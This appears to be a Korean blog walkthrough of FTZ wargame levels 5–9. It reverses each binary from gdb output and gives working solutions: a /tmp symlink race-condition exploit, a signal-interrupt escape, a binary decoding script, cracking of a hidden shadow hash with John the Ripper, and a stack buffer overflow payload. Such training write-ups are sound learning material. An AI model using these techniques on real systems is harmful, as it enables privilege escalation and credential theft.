해당 문제는 레이스컨디션에 관한 문제다. 레이스컨디션 공격은 프로세스의 경쟁 상태에서 발생하는 취약점이다. 다수의 프로세스가 특정 자원을 할당 받기위해 경쟁을 하게 되는데 이 때 발생하게 된다.

문제를 풀어보면서 정확한 개념을 이해해본다.

```
[level5@ftz level5]$ cat hint

/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.
```

힌트를 확인하면 위와 같은 문구를 확인할 수 있다. `level5` 프로그램을 분석해본다.

```assembly
(gdb) disass main
Dump of assembler code for function main:
0x0804842c <main+0>:	push   %ebp
0x0804842d <main+1>:	mov    %esp,%ebp
0x0804842f <main+3>:	sub    $0x8,%esp
0x08048432 <main+6>:	and    $0xfffffff0,%esp
0x08048435 <main+9>:	mov    $0x0,%eax
0x0804843a <main+14>:	sub    %eax,%esp
0x0804843c <main+16>:	sub    $0x8,%esp
0x0804843f <main+19>:	push   $0x180
0x08048444 <main+24>:	push   $0x8048580	; "/tmp/level5.tmp"
0x08048449 <main+29>:	call   0x804832c <creat>
0x0804844e <main+34>:	add    $0x10,%esp
0x08048451 <main+37>:	mov    %eax,0xfffffffc(%ebp)
0x08048454 <main+40>:	cmpl   $0x0,0xfffffffc(%ebp)
0x08048458 <main+44>:	jns    0x8048484 <main+88>
0x0804845a <main+46>:	sub    $0xc,%esp
0x0804845d <main+49>:	push   $0x80485a0	; "Can not creat a temporary file.\n"
0x08048462 <main+54>:	call   0x804835c <printf>
0x08048467 <main+59>:	add    $0x10,%esp
0x0804846a <main+62>:	sub    $0xc,%esp
0x0804846d <main+65>:	push   $0x8048580	; "/tmp/level5.tmp"
0x08048472 <main+70>:	call   0x804833c <remove>
0x08048477 <main+75>:	add    $0x10,%esp
0x0804847a <main+78>:	sub    $0xc,%esp
0x0804847d <main+81>:	push   $0x0
0x0804847f <main+83>:	call   0x804836c <exit>
0x08048484 <main+88>:	sub    $0x4,%esp
0x08048487 <main+91>:	push   $0x1f
0x08048489 <main+93>:	push   $0x80485e0	;	flag
0x0804848e <main+98>:	pushl  0xfffffffc(%ebp)
0x08048491 <main+101>:	call   0x804830c <write>
0x08048496 <main+106>:	add    $0x10,%esp
0x08048499 <main+109>:	sub    $0xc,%esp
0x0804849c <main+112>:	pushl  0xfffffffc(%ebp)
0x0804849f <main+115>:	call   0x804831c <close>
0x080484a4 <main+120>:	add    $0x10,%esp
0x080484a7 <main+123>:	sub    $0xc,%esp
0x080484aa <main+126>:	push   $0x8048580	; "/tmp/level5.tmp"
0x080484af <main+131>:	call   0x804833c <remove>
0x080484b4 <main+136>:	add    $0x10,%esp
0x080484b7 <main+139>:	leave  
0x080484b8 <main+140>:	ret    
0x080484b9 <main+141>:	nop    
0x080484ba <main+142>:	nop    
0x080484bb <main+143>:	nop    
End of assembler dump.
```

위의 어셈블리어를 핸드레이하여 소스코드를 복원하면 다음과 같다.

```c
#include <stdio.h>

int main(void){

        int fd=creat("/tmp/level5.tmp",384);
        if(fd<0)
        {
                printf("Can't creat a temporary file.\n");
                remove("/tmp/level5.tmp");
                exit(0);
        }
        else
        {
                write(fd,"FLAG",31);
                close(fd);
                remove("/tmp/level5.tmp");
        }
}
```

gdb를 통해 확인하면 거의 흡사한 것을 확인할 수 있다. 뿌듯
`creat` 함수를 통해 `/tmp/level5.tmp` 를 생성하고 파일이 존재하거나 권한으로 인해 생성하지 못하는 경우 문자열을 출력하고 `remove` 함수를 통해 임시파일을 삭제하고 종료한다.
생성에 성공하는 경우에는 해당 임시 파일에 플래그를 쓰고 난 후, 파일을 삭제한다.

파일에 쓰여지는 내용이 실제 `level6`의 패스워드 이므로 레이스 컨디션 공격을 이용해 임시 파일을 생성하기 직전에 특정 프로그램을 이용해 임시 파일에 링크를 걸고 링크 파일을 통해 미리 만들어 둔 파일에 내용을 쓰게 하면 된다.

말 그대로 경쟁 상태를 만들기 위해 루프를 도는 프로그램을 짜서 공격이 가능하다.

```c
//run.c
#include <stdio.h>

int main()
{
        int i;
        for(i=0;i<=10;i++)
        {
                system("/usr/bin/level5 & 2>/dev/null");
        }
}
```

```c
//race.c
#include <stdio.h>

int main()
{
        int i;
        system("touch /tmp/password");
        for(i=0;i<=10;i++)
        {
                printf("[+] %d Try racecondition.\n",i);
                system("ln -s /tmp/password /tmp/level5.tmp 2>/dev/null");
                printf("[+] Password\n");
                system("cat /tmp/password");
        }
        system("rm -rf /tmp/level5.tmp /tmp/password");

}
```

실행 결과는 다음과 같다.

```
[level5@ftz tmp]$ ./auto.sh 
[+] 0 Try racecondition.
[+] Password
[+] 1 Try racecondition.
[+] Password
[+] 2 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
[+] 3 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
[+] 4 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
[+] 5 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
[+] 6 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
[+] 7 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
[+] 8 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
[+] 9 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
[+] 10 Try racecondition.
[+] Password
next password : ~~~~~~~~~~~~~
```

재미있네잉!!!



## [+] FTZ level6

### Analysis

뭐냐이건... `level6`로 접속하면 아래와 같은 프로그램이 실행되는 것을 볼 수 있다.

```

  #####################################
  ##                                 ##
  ##         텔넷 접속 서비스        ##
  ##                                 ##
  ##                                 ##
  ##     1. 하이텔     2. 나우누리   ##
  ##     3. 천리안                   ##
  ##                                 ##
  #####################################

접속하고 싶은 bbs를 선택하세요 : 

```

아주 잠시... 초등학교 시절 썼던 하이텔이 보인다... 음 책을 보니 시스템 인터럽트와 관련된 문제라고 한다. root로 환경변수를 확인해보니 `tn`이라는 프로그램을 실행 시키는 것으로 확인되었다.

분석하자아ㅏ

```assembly
(gdb) disass main
Dump of assembler code for function main:
0x080484f8 <main+0>:	push   %ebp
0x080484f9 <main+1>:	mov    %esp,%ebp
0x080484fb <main+3>:	sub    $0x8,%esp
0x080484fe <main+6>:	sub    $0xc,%esp
0x08048501 <main+9>:	push   $0x80486f2	; "cat hint"
0x08048506 <main+14>:	call   0x8048384 <system>
0x0804850b <main+19>:	add    $0x10,%esp
0x0804850e <main+22>:	call   0x8048354 <getchar>
0x08048513 <main+27>:	sub    $0xc,%esp
0x08048516 <main+30>:	push   $0x80486fb	; "clear"
0x0804851b <main+35>:	call   0x8048384 <system>	; 여기부터
0x08048520 <main+40>:	add    $0x10,%esp
0x08048523 <main+43>:	sub    $0xc,%esp
0x08048526 <main+46>:	push   $0x8048720
0x0804852b <main+51>:	call   0x80483c4 <printf>
0x08048530 <main+56>:	add    $0x10,%esp
0x08048533 <main+59>:	sub    $0xc,%esp
0x08048536 <main+62>:	push   $0x8048760
0x0804853b <main+67>:	call   0x80483c4 <printf>
0x08048540 <main+72>:	add    $0x10,%esp
0x08048543 <main+75>:	sub    $0xc,%esp
0x08048546 <main+78>:	push   $0x80487a0
0x0804854b <main+83>:	call   0x80483c4 <printf>
0x08048550 <main+88>:	add    $0x10,%esp
0x08048553 <main+91>:	sub    $0xc,%esp
0x08048556 <main+94>:	push   $0x8048760
0x0804855b <main+99>:	call   0x80483c4 <printf>
0x08048560 <main+104>:	add    $0x10,%esp
0x08048563 <main+107>:	sub    $0xc,%esp
0x08048566 <main+110>:	push   $0x8048760
0x0804856b <main+115>:	call   0x80483c4 <printf>
0x08048570 <main+120>:	add    $0x10,%esp
0x08048573 <main+123>:	sub    $0xc,%esp
0x08048576 <main+126>:	push   $0x80487e0
0x0804857b <main+131>:	call   0x80483c4 <printf>
0x08048580 <main+136>:	add    $0x10,%esp
0x08048583 <main+139>:	sub    $0xc,%esp
0x08048586 <main+142>:	push   $0x8048820
0x0804858b <main+147>:	call   0x80483c4 <printf>
0x08048590 <main+152>:	add    $0x10,%esp
0x08048593 <main+155>:	sub    $0xc,%esp
0x08048596 <main+158>:	push   $0x8048760
0x0804859b <main+163>:	call   0x80483c4 <printf>
0x080485a0 <main+168>:	add    $0x10,%esp
0x080485a3 <main+171>:	sub    $0xc,%esp
0x080485a6 <main+174>:	push   $0x8048860
0x080485ab <main+179>:	call   0x80483c4 <printf>	; 여기까지 메뉴 출력
0x080485b0 <main+184>:	add    $0x10,%esp
0x080485b3 <main+187>:	sub    $0x8,%esp
0x080485b6 <main+190>:	push   $0x80484e0
0x080485bb <main+195>:	push   $0x2
0x080485bd <main+197>:	call   0x8048374 <signal>
0x080485c2 <main+202>:	add    $0x10,%esp
0x080485c5 <main+205>:	sub    $0xc,%esp
0x080485c8 <main+208>:	push   $0x80488a0	; "\n접속하고 싶은 bbs를 선택하세요 : "
0x080485cd <main+213>:	call   0x80483c4 <printf>
0x080485d2 <main+218>:	add    $0x10,%esp
0x080485d5 <main+221>:	sub    $0x8,%esp
0x080485d8 <main+224>:	lea    0xfffffffc(%ebp),%eax
0x080485db <main+227>:	push   %eax
0x080485dc <main+228>:	push   $0x80488c3
0x080485e1 <main+233>:	call   0x8048394 <scanf>
0x080485e6 <main+238>:	add    $0x10,%esp
0x080485e9 <main+241>:	cmpl   $0x1,0xfffffffc(%ebp)
0x080485ed <main+245>:	jne    0x80485ff <main+263>
0x080485ef <main+247>:	sub    $0xc,%esp
0x080485f2 <main+250>:	push   $0x80488c6	; "telnet 203.245.15.76"
0x080485f7 <main+255>:	call   0x8048384 <system>
0x080485fc <main+260>:	add    $0x10,%esp
0x080485ff <main+263>:	cmpl   $0x2,0xfffffffc(%ebp)
0x08048603 <main+267>:	jne    0x8048615 <main+285>
0x08048605 <main+269>:	sub    $0xc,%esp
0x08048608 <main+272>:	push   $0x80488db	; "telnet 203.238.129.97"
0x0804860d <main+277>:	call   0x8048384 <system>
0x08048612 <main+282>:	add    $0x10,%esp
0x08048615 <main+285>:	cmpl   $0x3,0xfffffffc(%ebp)
0x08048619 <main+289>:	jne    0x804862b <main+307>
0x0804861b <main+291>:	sub    $0xc,%esp
0x0804861e <main+294>:	push   $0x80488f1	; "telnet 210.120.128.180"
0x08048623 <main+299>:	call   0x8048384 <system>
0x08048628 <main+304>:	add    $0x10,%esp
0x0804862b <main+307>:	cmpl   $0x1,0xfffffffc(%ebp)
0x0804862f <main+311>:	je     0x804864d <main+341>
0x08048631 <main+313>:	cmpl   $0x2,0xfffffffc(%ebp)
0x08048635 <main+317>:	je     0x804864d <main+341>
0x08048637 <main+319>:	cmpl   $0x3,0xfffffffc(%ebp)
0x0804863b <main+323>:	je     0x804864d <main+341>
0x0804863d <main+325>:	sub    $0xc,%esp
0x08048640 <main+328>:	push   $0x8048920	; "잘못 입력하셨습니다. 접속을 종료합니다.\n"
0x08048645 <main+333>:	call   0x80483c4 <printf>
0x0804864a <main+338>:	add    $0x10,%esp
0x0804864d <main+341>:	leave  
0x0804864e <main+342>:	ret    
0x0804864f <main+343>:	nop    
End of assembler dump.
```

코드 복원 ㄱㄱ

```c
#include <stdio.h>

int sig_func(int signum);
int main()
{
        int sel=0;
        system("cat ../hint");
        getchar();
        system("clear");
        printf("1.Chol 2.Hitel 3.Nau\n");
        signal(2,sig_func);
        printf("Select Menu :");
        scanf("%d",&sel);
        switch(sel)
        {
                case 1:
                        system("telnet 203.245.15.76");
                case 2:
                        system("telnet 203.238.129.97");
                case 3:
                        system("telnet 210.120.128.180");
                default:
                        if(sel!=1 && sel!=2 && sel!=3){
                                printf("Invalid INPUT\n");
                                return ;
                        }
        }

}

int sig_func(int signum)
{
        printf("Can't use CTRL+C\n");
}
```

요렇게 하면 얼추 비슷한 코드가 나온다..
인터럽트에 관한 문제이므로 어디선가 중요한 시점에 인터럽트를 발생시키면 password가 존재하는 디렉토리로 이동되는 것을 확인할 수있다.

## [+] FTZ level7

### Analysis

이번 문제는 암호화와 관련되어 있다고 하나 매우 기초적인 문제이다..
`level7` 로 로그인하여 힌트 및 프로그램을 실행시켜 본다.

```
[level7@ftz level7]$ cat hint


/bin/level7 명령을 실행하면, 패스워드 입력을 요청한다.

1. 패스워드는 가까운곳에..
2. 상상력을 총동원하라.
3. 2진수를 10진수를 바꿀 수 있는가?
4. 계산기 설정을 공학용으로 바꾸어라.

[level7@ftz level7]$ find / f \( -perm +6000 -user level8 \) -exec ls {} \; 2>/dev/null
/bin/level7

[level7@ftz level7]$ level7
Insert The Password : test
--_--_- --____- ---_-__ --__-_-
```

분석을 해보자..

```assembly
(gdb) disass main
Dump of assembler code for function main:
0x08048454 <main+0>:	push   %ebp
0x08048455 <main+1>:	mov    %esp,%ebp
0x08048457 <main+3>:	sub    $0x8,%esp
0x0804845a <main+6>:	and    $0xfffffff0,%esp
0x0804845d <main+9>:	mov    $0x0,%eax
0x08048462 <main+14>:	sub    %eax,%esp
0x08048464 <main+16>:	sub    $0xc,%esp
0x08048467 <main+19>:	push   $0x64
0x08048469 <main+21>:	call   0x8048344 <malloc>
0x0804846e <main+26>:	add    $0x10,%esp
0x08048471 <main+29>:	mov    %eax,0xfffffffc(%ebp)
0x08048474 <main+32>:	sub    $0xc,%esp
0x08048477 <main+35>:	push   $0x80485c0	; "Insert The Password : "
0x0804847c <main+40>:	call   0x8048384 <printf>
0x08048481 <main+45>:	add    $0x10,%esp
0x08048484 <main+48>:	sub    $0x4,%esp
0x08048487 <main+51>:	pushl  0x8049744	;	""
0x0804848d <main+57>:	push   $0x64
0x0804848f <main+59>:	pushl  0xfffffffc(%ebp)
0x08048492 <main+62>:	call   0x8048354 <fgets>
0x08048497 <main+67>:	add    $0x10,%esp
0x0804849a <main+70>:	sub    $0x4,%esp
0x0804849d <main+73>:	push   $0x4
0x0804849f <main+75>:	push   $0x80485d7	; key
0x080484a4 <main+80>:	pushl  0xfffffffc(%ebp)
0x080484a7 <main+83>:	call   0x8048364 <strncmp>
0x080484ac <main+88>:	add    $0x10,%esp
0x080484af <main+91>:	test   %eax,%eax
0x080484b1 <main+93>:	jne    0x80484cd <main+121>
0x080484b3 <main+95>:	sub    $0xc,%esp
0x080484b6 <main+98>:	push   $0x80485e0	;	"\nCongratulation! next password is \"~~~~~~~~~~~~\".\n\n"
0x080484bb <main+103>:	call   0x8048384 <printf>
0x080484c0 <main+108>:	add    $0x10,%esp
0x080484c3 <main+111>:	sub    $0xc,%esp
0x080484c6 <main+114>:	push   $0x0
0x080484c8 <main+116>:	call   0x8048394 <exit>
0x080484cd <main+121>:	sub    $0xc,%esp
0x080484d0 <main+124>:	push   $0x8048617
0x080484d5 <main+129>:	call   0x8048334 <system>
0x080484da <main+134>:	add    $0x10,%esp
0x080484dd <main+137>:	leave  
0x080484de <main+138>:	ret    
0x080484df <main+139>:	nop    
End of assembler dump.
```

소스코드 복원!

```c
#include <stdio.h>

int main()
{
        char *input=(char *)malloc(100);
        printf("Insert The Password : ");
        fgets(input,100,stdin);
        if(strncmp(input,"flag",4)==0)
        {
                printf("\nCongratulation! next password is \"~~~~~~~~\".\n\n");
                exit(0);
        }
        else
        {
                system("cat /bin/wrong.txt");
        }

}
```

힌트 내용을 보면 간단히 해결할 수 있다. 오답 시 나오는 `-` 와 `_` 은 1과 0을 의미하는 이진수이고 이를 십진수로 확인하고 아스키코드로 변환하면 끝이난다. 대강 아래와 같이 파이썬으로 짜면된다아

```python
enc_flag='--_--_- --____- ---_-__ --__-_-'
tmp=''
flag=''
for i in range(len(enc_flag)):
    if enc_flag[i]=='-':
        tmp+='1'
    elif enc_flag[i]=='_':
        tmp+='0'
    else:
        flag+=chr(int(tmp,2))
        tmp=''
print flag+chr(int(tmp,2))
```



## [+] FTZ level8

### Analysis

```
[level8@ftz level8]$ cat hint


level9의 shadow 파일이 서버 어딘가에 숨어있다.
그 파일에 대해 알려진 것은 용량이 "2700"이라는 것 뿐이다.
```

```
[level8@ftz level8]$ find / -size 2700c -exec ls -l {} \; 2>/dev/null
-rw-r--r--    1 root     root         2700 Nov  6  2001 /var/www/manual/ssl/ssl_intro_fig2.gif
-r--r-----    1 root     level8       2700 Sep 10  2011 /etc/rc.d/found.txt
-rw-r--r--    1 root     root         2700 Feb 19  2003 /usr/share/man/man3/IO::Pipe.3pm.gz
-r--r--r--    1 root     root         2700 Jan 28  2003 /usr/share/man/man3/URI::data.3pm.gz
```

위와 같은 방법으로 해당 파일을 찾을 수 있다.

```
[level8@ftz level8]$ cat /etc/rc.d/found.txt 
level9:$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.:11040:0:99999:7:-1:-1:134549524
```

이건 보안기사에도 나왔던... shadow 파일의 구조를 보면 알 수 있다.
먼저 패스워드 필드인 두번째 필드를 보면 `$1$vkY6sSlG$6RyUXtNMEVGsfY7Xf0wps.` 으로 되어있다. 이때 `$` 을 기준으로 해당 필드가 의미하는 것을 알 수 있다.

`$1`은 md5로 해시화 되었다는 것을 의미하며 `$vkY6sSlG`은 솔트 값을 의미하고 마지막은 해시 값을 의미한다.

`john the ripper` 를 이용하여 찾아보자아!

```
root@shhoya-virtual-machine:/home/shhoya/john/john-1.8.0/run# ./john -show shadow 
level9:~~~~~~~:11040:0:99999:7:-1:-1:134549524

1 password hash cracked, 0 left
```

이렇게 찾을 수 있다.



## [+] FTZ level9

### Analysis

드디어 오버플로우 문제다... 길었지만 다 필요한 과정이긴하다
책에 나온대로 메모리 구조에 대해 알아보자

```c
#include <stdio.h>

int main()
{
        char AA;
        char strAA[1];
        char strBB[2];
        char strCC[3];
        char strDD[5];
        char strEE[9];
        char strFF[17];
        printf("AA's address is : 0x%x, sizeof:0x%x\n",&AA,sizeof(AA));
        printf("strAA[1]'s address is : 0x%x, sizeof:0x%x, distance: 0x%x\n",strAA,sizeof(strAA),&AA -strAA);
        printf("strBB[2]'s address is : 0x%x, sizeof:0x%x, distance: 0x%x\n",strBB,sizeof(strBB),strAA-strBB);
        printf("strCC[3]'s address is : 0x%x, sizeof:0x%x, distance: 0x%x\n",strCC,sizeof(strCC),strBB-strCC);
        printf("strDD[5]'s address is : 0x%x, sizeof:0x%x, distance: 0x%x\n",strDD,sizeof(strDD),strCC-strDD);
        printf("strEE[9]'s address is : 0x%x, sizeof:0x%x, distance: 0x%x\n",strEE,sizeof(strEE),strDD-strEE);
        printf("strFF[17]'s address is : 0x%x, sizeof:0x%x, distance: 0x%x\n",strFF,sizeof(strFF),strEE-strFF);
        return 0;
}
```

각 메모리 주소와 크기, 실제 할당 크기 를 출력한다. `gdb`를 이용해야 하므로 간단한 명령어 목록이다.

| no   | command                            |              description               |
| ---- | ---------------------------------- | :------------------------------------: |
| 0x1  | gdb \<filename>                    |               파일 열기                |
| 0x2  | list                               |   소스코드 확인(-g 옵션 컴파일 필요)   |
| 0x3  | disassemble \<address>,\<function> |          디스어셈블하여 출력           |
| 0x4  | run                                |              실행,재실행               |
| 0x5  | break \<address>,\<function>       |          브레이크 포인트 설정          |
| 0x6  | continue                           |                  실행                  |
| 0x7  | x/32x \<address>                   | 해당 주소에서부터 32개를 16진수로 출력 |
| 0x8  | info registers                     |             레지스터 출력              |
| 0x9  | nexti                              |     함수 내부 진입X 다음 라인 실행     |
| 0xA  | stepi                              |       함수 내부 진입O 라인 실행        |
| 0xB  | help                               |                 도움말                 |
| 0xC  | backtrace                          |       프로그램 실행의 스택 추적        |
| 0xD  | quit                               |                  종료                  |

자 실제 `level9` 문제로 돌아와 힌트를 살펴보면 소스코드가 존재하는 것을 확인할 수 있다.

```c
#include <stdio.h>

int main()
{
        char buf2[10];
        char buf[10];

        printf("It can be overflow : ");
        fgets(buf,40,stdin);
        printf("buf2 : 0x%x , buf : 0x%x\n",buf2,buf);	//주소 확인 추가

        if(strncmp(buf2,"go",2)==0)
        {
                printf("Good Skill!\n");
                setreuid(3010,3010);
                system("/bin/bash");
        }
}
```

`buf2`에 'go' 문자열이 존재하면 성공한다. 위의 소스코드를 컴파일 하여 실행하면 다음과 같은 결과가 나온다.

```
[level9@ftz tmp]$ ./a.out 
It can be overflow : AAAA
buf2 : 0xbfffe850 , buf : 0xbfffe840	
```

주소의 차이를 보면 0x10 바이트 만큼 차이가 나는 것을 확인할 수 있다.

| address  |     value      |
| :------: | :------------: |
| buf[10]  |      AAAA      |
|  dummy   |                |
| buf2[10] |                |
|  dummy   |                |
|   SFP    |   EBP backup   |
|   RET    | Return Address |

요런식이다. 함수의 호출 시 스택의 변화에 대해 찾아보면 알 수 있다.
그렇다면 buf2에 'go' 라는 문자열을 들어가도록 어떻게 하면 될까

기존 `buf` 변수는 10byte의 길이만 담는다. 그렇다면 넘치게 담는다면...

```assembly
(gdb) r  
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/level9/tmp/a.out 

Breakpoint 1, 0x0804844f in main ()
(gdb) ni
It can be overflow : AAAABBBBCCCCDDDD
0x08048454 in main ()
(gdb) x/8x $eax
0xbfffecc0:	0x41414141	0x42424242	0x43434343	0x44444444
0xbfffecd0:	0x4213000a	0x4000c660	0xbfffece8	0x080484b2
```

입력 값에 10byte보다 긴 16byte의 문자열을 입력 시 위와 같이 스택에 잘 쓰여지는 것을 볼 수 있다. `buf(0xbfffecc0),buf2(0xbfffecd0)` 이니 잘 덮어씌우면 문제는 해결!!

```assembly
Breakpoint 1, 0x0804844f in main ()
(gdb) ni
It can be overflow : 1111111111111111go
0x08048454 in main ()
(gdb) x/8x $eax
0xbfffe140:	0x31313131	0x31313131	0x31313131	0x31313131
0xbfffe150:	0x000a6f67	0x4000c660	0xbfffe168	0x080484b2
```

이렇게 메모리에 대한 접근 및 구조에 대한 이해가 되야 버퍼오버플로를 이해할 수 있다.

몇가지 명령줄이다아...

```
[level9@ftz tmp]$ (python -c 'print "A"*16+"go"'; cat) | /usr/bin/bof
It can be overflow : Good Skill!


```

그 외 공격코드를 만들어본다.

```c
#include <stdio.h>

#define VICTIM "/usr/bin/bof"
#define DEFAULT_BUFFER_SIZE 100

char cmdBuf[DEFAULT_BUFFER_SIZE];

int main(){
        sprintf(cmdBuf,"(python -c 'print \"A\"*16+\"go\"'; cat) | %s",VICTIM);
        system(cmdBuf);
        return 0;
}
```



# [+] Reference

1. <a href="http://wikibook.co.kr/system-hacking-techniques/?ckattempt=1">***문제 풀이로 배우는 시스템 해킹 테크닉*** </a>
